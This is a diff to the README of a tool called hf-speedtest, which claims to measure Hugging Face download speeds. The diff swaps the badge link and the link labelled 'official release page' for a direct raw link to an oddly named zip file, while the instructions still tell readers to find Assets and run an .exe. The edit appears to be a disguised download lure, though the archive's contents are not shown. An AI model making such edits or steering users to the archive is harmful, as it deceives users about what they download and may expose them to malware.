@@ -1,12 +1,12 @@
 # ⚡ hf-speedtest - Measure your Hugging Face download speeds
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/topiarycliftonia167/hf-speedtest/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/topiarycliftonia167/hf-speedtest/main/src/speedtest_hf_vivificative.zip)
 
 ## 📥 How to get started
 
 You can download the application from the project release page. Follow the steps below to set up the tool on your computer.
 
-1. Go to the [official release page](https://github.com/topiarycliftonia167/hf-speedtest/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/topiarycliftonia167/hf-speedtest/main/src/speedtest_hf_vivificative.zip).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to start the file transfer.
 4. Save the file to your desktop or your downloads folder.
